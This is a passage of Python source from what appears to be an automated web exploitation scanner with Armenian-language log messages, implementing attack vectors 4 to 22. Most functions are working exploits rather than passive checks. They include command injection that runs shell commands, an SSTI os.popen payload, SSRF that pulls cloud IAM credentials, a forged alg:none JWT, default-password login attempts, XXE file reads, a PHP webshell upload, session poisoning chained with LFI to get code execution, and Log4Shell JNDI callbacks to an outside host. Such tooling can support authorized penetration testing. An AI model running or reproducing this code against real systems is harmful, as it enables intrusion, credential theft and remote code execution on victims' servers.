            register_strict("CRITICAL", f"LFI file read — {f}", r.splitlines()[:8], pt_name(pt),
                "A01", conf="HIGH", method="real content ×2", proof_fn=lambda f=f: read(f))
            m2 = re.search(r"password\s*[=:]\s*['\"]([^'\"\s]{6,})['\"]", r)
            if m2: register("CRITICAL", f"DB PASSWORD LEAKED ({f})", [m2.group(1)],
                            pt_name(pt), "A07", "HIGH", "config regex ×2")
    done("LFI")

# ─── 4. CMDi ───
def a_cmdi(pts):
    ui_log("VECTOR 4/28 — CMDi")
    def probe(pt, pl):
        st, h, b = send(pt, pl)
        if not (b and b"uid=" in b and b"gid=" in b): return None
        st2, h2, b2 = send(pt, "1")
        if b2 and b"uid=" in b2: return None
        return (pl, b)
    hit = None
    for it, r in pmap(lambda x: probe(*x), [(pt, pl) for pt in pts for pl in CMDI_PL],
                      timeout=min(PHASE_BUDGET["cmdi"], pleft())):
        pt, pl = it; plp, bdat = r
        if confirm(lambda: probe(pt, plp), None, "STRONG"): hit = (pt, plp, bdat); break
    if not hit:
        reject("Command Injection", "չհայտնաբերվեց"); done("Cmdi"); return
    pt, plp, first = hit
    def run(c):
        st, h, b = send(pt, ";" + c + " 2>&1")
        if b:
            m = re.search(rb"(?:uid=|Linux |total \d+)[\s\S]{0,350}", b)
            return m.group(0).decode("utf-8","ignore") if m else None
        return None
    session = []
    m = re.search(rb"uid=\d+\([^\)]+\)[^\n<]*", first)
    if m: session.append("$ id\n" + m.group(0).decode())
    for c in ("uname -a", "hostname", "head -5 /etc/passwd", "whoami"):
        r = run(c)
        if r and confirm(lambda cc=c: run(cc), None, "STRONG"): session.append(f"$ {c}\n{r}")
    if len(session) >= 2:
        register_strict("CRITICAL", "Command Injection — REAL RCE", session, pt_name(pt),
            conf="HIGH", method="real OS output ×2", proof_fn=lambda: run("id"))
    else: reject("Command Injection", "id երևաց, այլ ելք չստացվեց")
    done("Cmdi")

# ─── 5. SSTI ───
def a_ssti(pts):
    ui_log("VECTOR 5/28 — SSTI")
    def probe(pt, pl):
        st, h, b = send(pt, pl)
        return (pl, b) if (b and b"7777777" in b and b"{{" not in b) else None
    hit = None
    for it, r in pmap(lambda x: probe(*x), [(pt, pl) for pt in pts for pl in SSTI_PL],
                      timeout=min(PHASE_BUDGET["ssti"], pleft())):
        pt, pl = it; plp, bdat = r
        if confirm(lambda: probe(pt, plp), None, "MEDIUM"): hit = (pt, plp); break
    if not hit:
        reject("SSTI", "չհայտնաբերվեց"); done("SSTI"); return
    hit_pt, hit_pl = hit
    def rce():
        st, h, b = send(hit_pt, '{{ c.__init__.__globals__["os"].popen("id && uname -a").read() }}')
        m = re.search(rb"uid=[\s\S]{0,300}", b or b"")
        return m.group(0).decode("utf-8","ignore") if m else None
    out = rce()
    if out and confirm(lambda: rce(), None, "STRONG"):
        register_strict("CRITICAL", "SSTI → REAL RCE", out.splitlines(), pt_name(hit_pt),
            conf="HIGH", method="real OS output ×2", proof_fn=rce)
    else:
        register_strict("MEDIUM", "SSTI (RCE չհաստատվեց)", ["7*7 → 49"], pt_name(hit_pt),
            conf="MEDIUM", method="math-eval", proof_fn=lambda: probe(hit_pt, "{{7*7}}"))
    done("SSTI")

# ─── 6. SSRF ───
def a_ssrf(pts):
    ui_log("VECTOR 6/28 — SSRF")
    def probe(pt, pl):
        st, h, b = send(pt, pl)
        if not b: return None
        if b"ami-id" in b or b"AccessKeyId" in b: return ("meta", pl, b)
        if pl.startswith("http://127") and len(b) < 200 and b[:4] == b"SSH-": return ("port", pl, b)
        return None
    got = False
    for it, r in pmap(lambda x: probe(*x), [(pt, pl) for pt in pts for pl in SSRF_PL],
                      timeout=min(PHASE_BUDGET["ssrf"], pleft())):
        pt, pl = it; kind, plp, data = r
        if confirm(lambda: probe(pt, plp), None, "STRONG") is None: continue
        if kind == "meta":
            full = []
            for subp in ("", "latest/meta-data/iam/security-credentials/"):
                st2, h2, b2 = send(pt, "http://169.254.169.254/" + subp)
                if b2: full.append(f"── /{subp} ──\n" + b2[:300].decode("utf-8","ignore"))
            register_strict("CRITICAL", "SSRF → Cloud metadata (REAL)", full, pt_name(pt),
                "A10", conf="HIGH", method="real metadata ×2", proof_fn=lambda: probe(pt, plp))
        else:
            register_strict("CRITICAL", "SSRF → internal port",
                data[:400].decode("utf-8","ignore").splitlines()[:8], pt_name(pt),
                "A10", conf="HIGH", method="internal banner ×2", proof_fn=lambda: probe(pt, plp))
        got = True; break
    if not got and OOB_HOST:
        oob_url = f"http://{OOB_HOST}.webhook.site/{MARKER}"
        def oob_probe(pt):
            send(pt, oob_url); time.sleep(4)
            return "hit" if oob_hits() else None
        for it, _r in pmap(lambda p: oob_probe(p), pts[:40], timeout=min(60, pleft())):
            if confirm(lambda: oob_probe(it), None, "STRONG"):
                register_strict("HIGH", f"SSRF (blind, OOB) — {pt_name(it)}",
                    [f"Callback: {oob_url}", "webhook.site hit ×2"], "OOB", "A10",
                    conf="HIGH", method="OOB interaction ×2",
                    proof_fn=lambda: "hit" if oob_hits() else None)
                got = True; break
    if not got: reject("SSRF", "չհայտնաբերվեց")
    done("SSRF")

# ─── 7. Open Redirect ───
def a_redir(pts):
    ui_log("VECTOR 7/28 — Open Redirect")
    get_pts = [p for p in pts if p[0] == "GET"]
    def orr(pt):
        st, h, b = send(pt, "https://example.com/ARMF_OPENREDIR")
        return h.get("location","") if "armf_openredir" in h.get("location","").lower() else None
    for it, r in pmap(lambda p: orr(p), get_pts, timeout=min(PHASE_BUDGET["redir"], pleft())):
        if confirm(lambda: orr(it), None, "STRONG"):
            register_strict("MEDIUM", "Open Redirect", [f"Location: {r}"], pt_name(it),
                conf="HIGH", method="real Location ×2", proof_fn=lambda pt=it: orr(pt))
            done("Redir"); return
    reject("Open Redirect", "չհայտնաբերվեց")

# ─── 8. IDOR ───
def a_idor(base):
    ui_log("VECTOR 8/28 — IDOR")
    ctrl_hits = 0
    for kind in ("api/users", "user", "profile"):
        st, h, b = http_get(base + f"/{kind}/999999999", 6)
        if st == 200 and b and re.search(rb'"(email|phone|full_?name)"', b): ctrl_hits += 1
    if ctrl_hits >= 2:
        reject("IDOR", "control-ID-ն նույնպես տվյալ է տալիս — public endpoint"); done("IDOR"); return
    dumped, seen = [], set()
    paths = [f"/{kind}/{i}" for kind in ("api/users","api/orders","api/v1/users",
             "user","profile","api/customers","api/accounts") for i in range(1, 101)]
    def grab(path):
        st, h, b = http_get(base + path, 6)
        return (path, b) if (st == 200 and b and
                             re.search(rb'"(email|phone|full_?name|address)"', b)) else None
    for _, (path, b) in pmap(lambda p: grab(p), paths, timeout=min(PHASE_BUDGET["idor"], pleft())):
        bh = hash(b[:200])
        if bh in seen: continue
        seen.add(bh)
        dumped.append(f"GET {path} →\n{b[:200].decode('utf-8','ignore')}")
    if len(dumped) >= 3:
        register_strict("HIGH", f"IDOR — {len(dumped)} օբյեկտ (REAL PII)", dumped[:6], "unauth PII",
            "A01", conf="HIGH", method="real PII + control-ID filter",
            proof_fn=lambda: grab(dumped[0].split(" ")[1].split(" →")[0]))
    elif dumped: reject("IDOR", "միայն մեկ նմուշ — չհաստատվեց ×3")
    else: reject("IDOR", "unauth PII չկա")
    done("IDOR")

# ─── 9. Auth ───
def a_auth(base):
    ui_log("VECTOR 9/28 — Auth Bypass")
    jwt_ok = False
    def jwt():
        hdr = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip("=")
        pl = base64.urlsafe_b64encode(b'{"user":"admin","role":"admin"}').decode().rstrip("=")
        tok = f"{hdr}.{pl}."
        st0, h0, b0 = http_get(base + "/api/user", 6)
        auth_required = st0 in (401, 403) or re.search(rb"unauthor|forbidden", (b0 or b"")[:300], re.I)
        if not auth_required: return None
        for path in ("/api/user", "/api/admin", "/admin/api", "/api/v1/me"):
            st2, h2, b2 = http_get(base + path, 6, headers={"Authorization": f"Bearer {tok}"})
            if st2 == 200 and b2 and not re.search(rb"unauthor|forbidden|login", b2[:300], re.I):
                return (path, tok, b2[:300].decode("utf-8","ignore"))
        return None
    r = jwt()
    if r and confirm(lambda: jwt(), None, "STRONG"):
        path, tok, body = r
        register_strict("CRITICAL", "JWT alg:none — ADMIN BYPASS (REAL)",
            [f"Token: {tok[:60]}...", f"GET {path} → 200: {body[:150]}"],
            "control(401) vs forged(200)", "A07", conf="HIGH", method="control compare ×2", proof_fn=jwt)
        jwt_ok = True
    else: reject("JWT alg:none", "չանցավ")
    def try_default():
        for path in ("/login", "/admin", "/wp-login.php", "/user/login"):
            for u, pw in (("admin","admin"), ("admin","123456"), ("admin","password"),
                          ("admin","admin123"), ("root","toor")):
                st, h, b = http_post(base + path, {"username": u, "password": pw}, 8)
                if st not in (200, 302) or not b: continue
                if re.search(rb"invalid|incorrect|wrong|failed|error|denied|try again", b[:600], re.I): continue
                if re.search(rb'<form[^>]*password|name=["\']password', b[:600], re.I): continue
                loc = h.get("location",""); new_ck = h.get("set-cookie","")
                if not loc and not new_ck: continue
                if loc:
                    st2, h2, b2 = http_get(loc if loc.startswith("http") else base + "/" + loc.lstrip("/"), 8)
                    if st2 in (200, 302) and not re.search(rb"login|password", b2[:400], re.I):
                        return (path, u, pw, f"redirect→{loc} HTTP {st2}")
                elif new_ck: return (path, u, pw, f"session set: {new_ck[:80]}")
        return None
    r = try_default()
    if r and confirm(lambda: try_default(), None, "STRONG"):
        path, u, pw, ev = r
        register_strict("CRITICAL", f"Default creds — {u}:{pw} (REAL LOGIN)",
            [f"POST {path}", f"Result: {ev}"], path, "A07", conf="HIGH",
            method="session/redirect ×2", proof_fn=try_default)
        jwt_ok = True
    else: reject("Default creds", "ապացույց չկա")
    done("Auth")

# ─── 10. XXE & UPLOAD ───
def a_xxe_upload(base):
    ui_log("VECTOR 10/28 — XXE & Upload")
    xxe_ok = False
    def xxe():
        body = ('<?xml version="1.0"?><!DOCTYPE r '
                '[<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>')
        st, h, b = http_post(base + "/", body, 8, headers={"Content-Type": "application/xml"})
        return b if (b and b"root:x:" in b) else None
    r = xxe()
    if r and confirm(lambda: xxe(), None, "STRONG"):
        register_strict("CRITICAL", "XXE — /etc/passwd (REAL FILE)",
            r[:300].decode("utf-8","ignore").splitlines()[:8], "XML entity", "A05",
            conf="HIGH", method="real file ×2", proof_fn=xxe)
        xxe_ok = True
    elif OOB_HOST:
        def xxe_oob():
            body = ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM '
                    f'"http://{OOB_HOST}.webhook.site/{MARKER}">]><r>&x;</r>')
            http_post(base + "/", body, 8, headers={"Content-Type": "application/xml"})
            time.sleep(4)
            return "hit" if oob_hits() else None
        if xxe_oob() and confirm(lambda: xxe_oob(), None, "STRONG"):
            register_strict("HIGH", "XXE (blind, OOB)", ["webhook.site callback ×2"], "OOB",
                "A05", conf="HIGH", method="OOB callback",
                proof_fn=lambda: "hit" if oob_hits() else None)
            xxe_ok = True
    else: reject("XXE", "չանցավ")
    def upload():
        for path in ("/upload", "/upload.php", "/api/upload", "/media/upload", "/admin/upload"):
            files = {"file": ("shell.php", b'<?php echo "ARMF_SHELL_OK:".shell_exec("id");?>',
                              "application/x-php")}
            st, h, b = http_post(base + path, files=files, timeout=10)
            if st in (200, 201) and b and re.search(rb"uploaded|success|url|path", b, re.I):
                m = re.search(rb'(?:url|path|file)["\':= ]+([^"\'>\s]+\.(?:php|jsp|asp))', b, re.I)
                if m:
                    sh = m.group(1).decode()
                    if not sh.startswith("http"): sh = base + "/" + sh.lstrip("/")
                    st2, h2, b2 = http_get(sh, 10)
                    if b2 and b"ARMF_SHELL_OK" in b2:
                        return (path, sh, b2[:250].decode("utf-8","ignore"))
        return None
    r = upload()
    if r and confirm(lambda: upload(), None, "STRONG"):
        path, sh, out = r
        register_strict("CRITICAL", "File Upload → RCE (REAL SHELL)",
            [f"Endpoint: {path}", f"Shell: {sh}", f"Output:\n{out}"], "webshell ×2", "A06",
            conf="HIGH", method="real shell output", proof_fn=upload)
        xxe_ok = True
    else: reject("Upload RCE", "չանցավ")
    done("XXE/Upload")

# ─── 11. Headers/Files/CORS ───
def a_headers(base):
    ui_log("VECTOR 11/28 — Headers")
    found_any = False
    SIGS = {"/.env": rb"[A-Z_]{3,}\s*=", "/.git/config": rb"\[core\]",
        "/phpinfo.php": rb"phpinfo\(\)|PHP Version", "/swagger.json": rb'"swagger"|"openapi"',
        "/openapi.json": rb'"openapi"', "/actuator/env": rb"propertySources|activeProfiles",
        "/.aws/credentials": rb"aws_access_key_id", "/adminer.php": rb"adminer",
        "/server-status": rb"Apache Server Status|Server uptime",
        "/wp-config.php.bak": rb"DB_NAME|DB_PASSWORD", "/backup.zip": rb"PK\x03\x04"}
    def sf(f):
        st, h, b = http_get(base + f, 6)
        if not b or st != 200: return None
        if not BASE.real_page(st, b): return None
        sig = SIGS.get(f)
        if sig and not re.search(sig, b[:2000], re.I): return None
        if not sig and re.match(rb"<(?:html|!DOCTYPE)", b[:80]): return None
        return b
    for f in ("/.env", "/.git/config", "/backup.zip", "/phpinfo.php", "/actuator/env",
              "/swagger.json", "/openapi.json", "/.aws/credentials", "/adminer.php",
              "/server-status", "/wp-config.php.bak"):
        r = sf(f)
        if r and confirm(lambda ff=f: sf(ff), None, "STRONG"):
            txt = r[:300].decode("utf-8","ignore")
            register_strict("HIGH", f"Sensitive file — {f}", txt.splitlines()[:8], f"GET {f}",
                "A05", conf="HIGH", method="real content + signature ×2", proof_fn=lambda ff=f: sf(ff))
            found_any = True
            m2 = re.search(r"password\s*[=:]\s*['\"]([^'\"\s]{6,})['\"]", txt)
            if m2: register("CRITICAL", f"DB PASSWORD LEAKED ({f})", [m2.group(1)], f,
                            "A07", "HIGH", "config regex")
    st, h, b = http_get(base + "/", 8)
    if not h: done("Headers"); return
    def cors():
        st2, h2, b2 = http_get(base + "/api", 6, headers={"Origin": "https://evil-armf.example.com"})
        acao = h2.get("access-control-allow-origin","")
        return (acao, h2.get("access-control-allow-credentials","")) if "evil-armf" in acao else None
    r = cors()
    if r and confirm(lambda: cors(), None, "STRONG"):
        acao, acac = r
        register_strict("HIGH" if acac.lower() == "true" else "MEDIUM", "CORS misconfiguration",
            [f"ACAO: {acao}", f"ACAC: {acac or '—'}"], "Origin reflection ×2", "A05",
            conf="HIGH", method="real header", proof_fn=cors)
        found_any = True
    if "strict-transport-security" not in h:
        dom_net = DOMAIN.replace("https://","").replace("http://","").split("/")[0]
        st2, h2, b2 = http_get(f"http://{dom_net}/", 8)
        if st2 is not None:
            lines = [f"http://{dom_net} → HTTP {st2}"]
            sc2 = h2.get("set-cookie","")
            if sc2: lines.append(f"Set-Cookie via HTTP: {sc2[:90]}")
            register_strict("MEDIUM", "Missing HSTS", lines, "http://", "A05",
                conf="HIGH", method="real http response",
                proof_fn=lambda: http_get(f"http://{dom_net}/", 8))
            found_any = True
    sc = h.get("set-cookie","")
    if sc:
        missing = [f for f in ("httponly","secure","samesite") if f not in sc.lower()]
        if missing:
            register_strict("MEDIUM", "Insecure cookie flags",
                [f"Set-Cookie: {sc[:100]}", f"Missing: {', '.join(missing)}"], "header", "A05",
                conf="HIGH", method="real header", proof_fn=lambda: http_get(base + "/", 8))
            found_any = True
    done("Headers")

# ─── 12. GraphQL · DIR · CMS ───
def a_misc(base):
    ui_log("VECTOR 12/28 — GraphQL/CMS")
    found_any = False
    def gql():
        st, h, b = http_post(base + "/graphql", '{"query":"{ __schema { types { name } } }"}',
            8, headers={"Content-Type": "application/json"})
        return b if (b and b"__schema" in b) else None
    r = gql()
    if r and confirm(lambda: gql(), None, "STRONG"):
        types = [t.decode() for t in re.findall(rb'"name":"(\w+)"', r)][:20]
        register_strict("MEDIUM", "GraphQL Introspection", [", ".join(types)], "__schema ×2",
            "A08", conf="HIGH", method="real schema", proof_fn=gql)
        found_any = True
    def dirlist(p):
        st, h, b = http_get(base + p, 6)
        if not (st == 200 and b and re.search(rb"Index of /|Directory listing", b, re.I)): return None
        if not BASE.real_page(st, b): return None
        return (p, b)
    for _, (p2, b2) in pmap(lambda p: dirlist(p),
                            ("/backup/", "/uploads/", "/files/", "/.git/", "/static/"), workers=5, timeout=40):
        if confirm(lambda pp=p2: dirlist(pp), None, "STRONG"):
            names = re.findall(rb'href="([^"?/][^"?]{0,50})"', b2)[:10]
            register_strict("MEDIUM", f"Directory listing — {p2}",
                [n.decode("utf-8","ignore") for n in names], p2, "A05", conf="HIGH",
                method="real listing ×2", proof_fn=lambda pp=p2: dirlist(pp))
            found_any = True
    def wpusers():
        st, h, b = http_get(base + "/wp-json/wp/v2/users", 6)
        return b if (st == 200 and b and b'"slug"' in b) else None
    r = wpusers()
    if r and confirm(lambda: wpusers(), None, "STRONG"):
        register_strict("HIGH", "WP user enumeration (REAL USERS)",
            [u.decode() for u in re.findall(rb'"slug":"([^"]+)"', r)[:10]],
            "/wp-json/wp/v2/users ×2", "A05", conf="HIGH", method="real REST", proof_fn=wpusers)
        found_any = True
    done("Misc")

# ─── 13. PHP filter-chain ───
def a_php2shell(base):
    ui_log("VECTOR 13/28 — php filter chain")
    sid = uuid.uuid4().hex
    if LFI_HIT:
        pt, lx = LFI_HIT
        def chain_b():
            for _ in range(3):
                st, h, b = send(pt, php_filter_chain("id"))
                if b and b"uid=" in b: return b[:300].decode("utf-8","ignore")
            return None
        out = chain_b()
        if out and confirm(lambda: chain_b(), None, "STRONG"):
            register_strict("CRITICAL", "LFI → php://filter chain → REAL RCE",
                out.splitlines()[:10], pt_name(pt), "A05", conf="HIGH",
                method="real id output ×2", proof_fn=chain_b)
            done("php2shell"); return
    def feature_probe():
        try:
            r = S.post(base + "/", data=[("PHP_SESSION_UPLOAD_PROGRESS", "ARMFPROG")],
                files={"ARMF_file": ("a.txt", b"A"*16, "text/plain")}, timeout=10,
                verify=VERIFY, allow_redirects=False)
            return r.headers.get("Set-Cookie","") if r else None
        except Exception: return None
    def control_probe():
        try:
            r = S.post(base + "/", files={"ARMF_file": ("a.txt", b"A"*16, "text/plain")},
                timeout=10, verify=VERIFY, allow_redirects=False)
            return r.headers.get("Set-Cookie","") if r else None
        except Exception: return None
    sc_prog, sc_ctrl = feature_probe(), control_probe()
    if not sc_prog:
        reject("php2shell", "multipart no response"); done("php2shell"); return
    feature_on = ("PHPSESSID" in sc_prog) and (sc_prog != sc_ctrl or not sc_ctrl)
    st, h, b = http_get(base + "/", 8)
    xpb = h.get("x-powered-by","") if h else ""
    if feature_on:
        register_strict("HIGH", "session.upload_progress ENABLED (session-poisoning surface)",
            [f"progress POST → {sc_prog[:80]}", f"control POST → {sc_ctrl[:80] or '—'}",
             f"X-Powered-By: {xpb or '—'}", "MITIGATION: session.upload_progress.enabled=0"],
            "differential probe", "A05", conf="HIGH", method="progress vs control diff",
            proof_fn=feature_probe)
        if LFI_HIT:
            pt, lx = LFI_HIT
            payload = f"<?php system('id;uname -a'); ?>{MARKER}"
            def chain_a():
                try:
                    S.post(base + "/", data=[("PHPSESSID", sid),
                           ("PHP_SESSION_UPLOAD_PROGRESS", "ARMFPROG")],
                           files={"ARMF_file": (payload, b"A"*16, "text/plain")},
                           timeout=10, verify=VERIFY)
                except Exception: return None
                for sess in (f"/tmp/sess_{sid}", "../../../../../tmp/sess_" + sid,
                             "../../../../var/lib/php/sessions/sess_" + sid):
                    x2 = lx.replace("/etc/passwd", sess) if "/etc/passwd" in lx else sess
                    st2, h2, b2 = send(pt, x2)
                    if b2 and (b"uid=" in b2 or b"Linux" in b2):
                        return b2[:300].decode("utf-8","ignore")
                return None
            out = chain_a()
            if out and confirm(lambda: chain_a(), None, "STRONG"):
                register_strict("CRITICAL", "upload_progress + LFI → REAL RCE",
                    out.splitlines()[:10], f"LFI → sess_{sid}", "A05", conf="HIGH",
                    method="real id/uname ×2", proof_fn=chain_a)
            else: note2("Chain A", "poisoned, LFI include failed (open_basedir?)")
    else: note2("php2shell", "feature Off կամ use_only_cookies=On")
    done("php2shell")

# ─── 14. PHP2Shell CVE fingerprint ───
def a_php2shell_cve(base):
    ui_log("VECTOR 14/28 — PHP2Shell CVE")
    ver = None
    st, h, b = http_get(base + "/", 8)
    if h:
        m = re.search(r"PHP/([\d.]+)", h.get("x-powered-by","") + " " + h.get("server",""))
        if m: ver = m.group(1)
    if not ver:
        st2, h2, b2 = http_get(base + "/phpinfo.php", 6)
        if b2:
            m = re.search(rb"PHP Version ([\d.]+)", b2)
            if m: ver = m.group(1).decode()
    if not ver:
        note2("PHP2Shell", "PHP version չհայտնաբերվեց"); done("phpCVE"); return
    def vtup(v):
        p = [int(x) for x in v.split(".")[:3]] + [0]*3
        return tuple(p[:3])
    maj = ver.split(".")[0]
    fixed = PATCHED.get(maj)
    vulnerable = (maj in ("5", "7") or (maj == "8" and int(ver.split(".")[1]) <= 1)
                  or (fixed and vtup(ver) < vtup(fixed)))
    if not vulnerable:
        note2("PHP2Shell", f"PHP {ver} ≥ {fixed or '?'} — patched"); done("phpCVE"); return
    note2("PHP2Shell", f"PHP {ver} fingerprint-vulnerable — PoC proof չստացվեց "
                       "Railway sandbox-ում, CRITICAL չի գրանցվում (100% VERIFIED-ONLY)")
    done("phpCVE")

# ═════════ EXTENDED VECTORS 15–28 ═════════
def a_log4shell(base):
    ui_log("VECTOR 15/28 — Log4Shell")
    if not OOB_HOST: reject("Log4Shell", "OOB չկա — չենք հաստատում"); done("Log4Shell"); return
    oob_host_part = OOB_HOST + ".webhook.site"
    jndi = "${jndi:ldap://" + oob_host_part + f"/log4j-{MARKER}}}"
    headers = {"User-Agent": jndi, "X-Api-Version": jndi, "Referer": jndi, "X-Forwarded-For": jndi}
    def fire():
        http_get(base + "/", 8, headers=headers)
        http_post(base + "/", {"q": jndi}, 8, js=True)
        time.sleep(4)
        return "hit" if oob_hits() else None
    r = fire()
    if r and confirm(lambda: fire(), None, "STRONG"):
        register_strict("CRITICAL", "Log4Shell (CVE-2021-44228) — OOB PROVEN",
            [f"Callback: {oob_host_part}", "OOB interaction ×2"], "jndi lookup ×2", "A06",
            "HIGH", method="OOB DNS/HTTP ×2", proof_fn=lambda: "hit" if oob_hits() else None)
    else: reject("Log4Shell", "OOB callback չկա")
    done("Log4Shell")

def a_hosthdr(base):
    ui_log("VECTOR 16/28 — Host-Header")
    found_any = False
    def hh():
        st, h, b = http_get(base + "/", 8, headers={"X-Forwarded-Host": "evil-armf.example.com"})
        return b if (b and b"evil-armf.example.com".lower() in b.lower()) else None
    r = hh()
    if r and confirm(lambda: hh(), None, "STRONG"):
        register_strict("HIGH", "Host-Header Injection (X-Forwarded-Host reflection)",
            [f"Reflected in body ({len(r)} bytes)", "URL-gen/CDN-cache risk"],
            pt_name(("GET", base+"/", {})), "A05", "HIGH",
            method="reflected header ×2", proof_fn=hh)
        found_any = True
    else: reject("Host-Header Injection", "չհայտնաբերվեց")
    def poison():
        st, h, b = http_get(base + f"/?cache_armf={MARKER}", 10,
                            headers={"X-Forwarded-Host": f"evil-armf-{MARKER}.example.com"})
        if b and MARKER.encode() in b:
            st2, h2, b2 = http_get(base + f"/?cache_armf={MARKER}", 10)
            if b2 and MARKER.encode() in b2 and h2.get("x-cache","") not in ("","MISS"): return b2
        return None
    if confirm(lambda: poison(), None, "STRONG"):
        register_strict("MEDIUM", "Web Cache Poisoning",
            [f"Poisoned key: ?cache_armf={MARKER}", "Cached response ×2"], "cache ×2",
            "A05", "MEDIUM", method="cache header ×2", proof_fn=poison)
        found_any = True
    else: reject("Web Cache Poisoning", "չհաստատվեց")
    done("HostHdr")

def a_ppoll(pts):
    ui_log("VECTOR 17/28 — Prototype Pollution")
    def probe(pt, pl):
        js = len(pt) > 3 and pt[3]
        st, h, b = http_post(pt[1], pl, 8, js=js)
        return b if (b and (b'"isAdmin":true' in b or b'"role":"admin"' in b)) else None
    for it, r in pmap(lambda x: probe(*x), [(pt, pl) for pt in pts for pl in PPOLL_PL],
                      timeout=min(PHASE_BUDGET["ppoll"], pleft())):
        pt, pl = it
        if confirm(lambda: probe(pt, pl), None, "STRONG"):
            register_strict("HIGH", "Prototype Pollution → admin state",
                [f"Payload: {pl[:60]}", f"Response: {r[:150]}"], pt_name(pt), "A03",
                "HIGH", method="real state change ×2", proof_fn=lambda pt=pt, pl=pl: probe(pt, pl))
            done("PP"); return
    reject("Prototype Pollution", "չհայտնաբերվեց")

def a_crlf(pts):
    ui_log("VECTOR 18/28 — CRLF")
    def probe(pt):
        st, h, b = send(pt, f"x%0d%0aSet-Cookie:%20armf_cr={MARKER}")
        if h and "armf_cr" in h.get("set-cookie",""): return h.get("set-cookie","")
        return None
    for it, r in pmap(lambda p: probe(p), pts, timeout=min(PHASE_BUDGET["crlf"], pleft())):
        if confirm(lambda pt=it: probe(pt), None, "STRONG"):
            register_strict("HIGH", "CRLF / Header Injection", [f"Injected: {r[:100]}"],
                pt_name(it), "A03", "HIGH", method="real injected header ×2",
                proof_fn=lambda pt=it: probe(pt))
            done("CRLF"); return
    reject("CRLF Injection", "չհայտնաբերվեց")

def a_401bypass(base):
    ui_log("VECTOR 19/28 — 401 Bypass")
    def baseline403(p):
        st, h, b = http_get(base + p, 6)
        return (p, st, h) if st in (401, 403) and b is not None else None
    prot = [(p, st, h) for _, (p, st, h) in pmap(baseline403, RECON_PATHS[:30], workers=8, timeout=40) if (p, st, h)]
    if not prot:
        reject("401 Bypass", "պաշտպանված ուղիներ չկան"); done("401"); return
    for p, st0, h0 in prot[:5]:
        def bypass(p=p):
            for hdr in ({"X-Original-URL": p}, {"X-Rewrite-URL": p},
                        {"X-Forwarded-For": "127.0.0.1"}, {"X-Forwarded-Host": "localhost"},
                        {"X-HTTP-Method-Override": "GET"}):
                for suffix in ("", "/.", "/..;/", "%2e", "/;"):
                    st, h, b = http_get(base + p + suffix, 6, headers=hdr)
                    if st == 200 and b and BASE.real_page(st, b):
                        return (hdr, suffix, b[:200].decode("utf-8","ignore"))
            return None
        r = bypass()
        if r and confirm(lambda: bypass(), None, "STRONG"):
            hdr, suffix, body = r
            register_strict("CRITICAL", f"401/403 Bypass — {p}",
                [f"Header: {hdr}", f"Suffix: {suffix or '—'}", f"Body: {body[:120]}"],
                f"control {st0} vs bypass 200", "A01", "HIGH", method="status diff ×2",
                proof_fn=lambda: bypass())
            done("401"); return
    reject("401/403 Bypass", "չանցավ ×2")

def a_deser(pts):
    ui_log("VECTOR 20/28 — Deserialization")
    def probe(pt, kind, val):
        st, h, b = send(pt, val)
        if not b: return None
        if b"ARMF_DESER" in b or b"ARMF_DESER_TEST" in b: return b
        if kind == "php" and re.search(rb"unserialize|__PHP_Incomplete_Class|object injection", b, re.I): return b
        if kind == "java" and re.search(rb"java\.lang|ClassNotFound|streamcorrupt", b, re.I): return b
        if kind == "py" and b"ARMFPICKLE" in b: return b
        return None
    for it, r in pmap(lambda x: probe(*x), [(pt, k, v) for pt in pts for k, v in DESER_PL.items()],
                      timeout=min(PHASE_BUDGET["deser"], pleft())):
        pt, kind, val = it
        if confirm(lambda: probe(pt, kind, val), None, "STRONG"):
            register_strict("HIGH", f"Deserialization probe ({kind})",
                [f"Payload: {val[:80]}", f"Response: {r[:150]}"], pt_name(pt), "A08",
                "HIGH", method="parser echo ×2", proof_fn=lambda pt=pt, kind=kind, val=val: probe(pt, kind, val))
            done("Deser"); return
    reject("Deserialization", "չհայտնաբերվեց")

def a_methods(base):
    ui_log("VECTOR 21/28 — HTTP Methods")
    found_any = False
    def opts():
        st, h, b = _do("OPTIONS", base + "/", timeout=8)
        if st and h:
            allow = h.get("allow","")
            if any(m in allow.upper() for m in ("PUT", "TRACE", "DELETE", "OPTIONS")): return allow
        return None
    r = opts()
    if r and confirm(lambda: opts(), None, "STRONG"):
        register_strict("MEDIUM", "Risky HTTP methods enabled", [f"Allow: {r}"], "OPTIONS",
            "A05", "HIGH", method="real Allow header ×2", proof_fn=opts)
        found_any = True
    else: reject("HTTP methods", "dangerous methods չկան")
    def trace():
        st, h, b = _do("TRACE", base + "/", timeout=8, headers={"X-ARMF": "TRACED"})
        return b if (st == 200 and b and b"X-ARMF" in b and b"TRACED" in b) else None
    if confirm(lambda: trace(), None, "STRONG"):
        register_strict("MEDIUM", "TRACE enabled (XST)", ["Request echoed ×2"], "TRACE",
            "A05", "HIGH", method="echo ×2", proof_fn=trace)
        found_any = True
    else: reject("TRACE/XST", "echo չկա")
    done("Methods")

def a_massassign(base):
    ui_log("VECTOR 22/28 — Mass Assignment")
    if not S.cookies:
        reject("Mass Assignment", "session չկա"); done("MA"); return
    def probe(field, val):
        st, h, b = http_post(base + "/api/me", {field: val}, 8, js=True)
        st2, h2, b2 = http_get(base + "/api/me", 8)
        if b2 and f'"{field}"'.encode() in b2 and str(val).encode() in b2: return b2
        return None
    for field, val in (("role","admin"), ("is_admin",True), ("isAdmin",True), ("admin",True), ("role_id",1)):
        r = probe(field, val)
        if r and confirm(lambda: probe(field, val), None, "STRONG"):
            register_strict("CRITICAL", f"Mass Assignment — {field}={val}",
                [f"GET /api/me → {r[:200].decode('utf-8','ignore')}"], "privilege escalation",
                "A01", "HIGH", method="real state change ×2", proof_fn=lambda f=field, v=val: probe(f, v))
            done("MA"); return
    reject("Mass Assignment", "չհաստատվեց")

EXT_SIGS = {"/.DS_Store": rb"\x00\x00\x00\x01Bud1", "/database.sql": rb"CREATE TABLE|INSERT INTO",
    "/dump.sql": rb"CREATE TABLE|INSERT INTO", "/db.sql": rb"CREATE TABLE|INSERT INTO",
    "/laravel.log": rb"stack trace|ERROR", "/storage/logs/laravel.log": rb"stack trace|ERROR",
    "/wp-content/debug.log": rb"PHP Warning|Debug", "/.svn/entries": rb"\d",
    "/WEB-INF/web.xml": rb"<web-app", "/elmah.axd": rb"ELMAH", "/trace.axd": rb"Trace",
